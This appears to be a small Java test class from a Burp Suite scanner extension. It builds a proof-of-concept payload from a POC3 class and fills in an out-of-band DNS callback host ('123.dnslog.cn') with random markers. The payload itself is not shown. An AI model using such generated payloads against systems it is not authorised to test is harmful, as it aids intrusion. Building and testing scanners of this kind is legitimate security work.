import burp.payload.IPoc;
import burp.payload.pocs.POC3;
import burp.util.Utils;

/**
 * @author : metaStor
 * @date : Created 2022/4/6 10:05 PM
 * @description:
 */
public class Test {

    public static void main(String[] args) throws InterruptedException {
        IPoc poc3 = new POC3();
        String[] poc33 = poc3.genPoc().split("&");
        String key1 = poc33[0].split("=")[0];
        String value1 = String.format(poc33[0].split("=")[1], "123.dnslog.cn", Utils.randomStr(4));
        String key2 = String.format(poc33[1].split("=")[0], Utils.randomStr(2));
        String value2 = String.format(poc33[1].split("=")[1], Utils.randomStr(2));
        System.out.println(key1 + "=" + value1);
        Thread.sleep(1000 * 10);
        System.out.println(key2 + "=" + value2);
    }
}
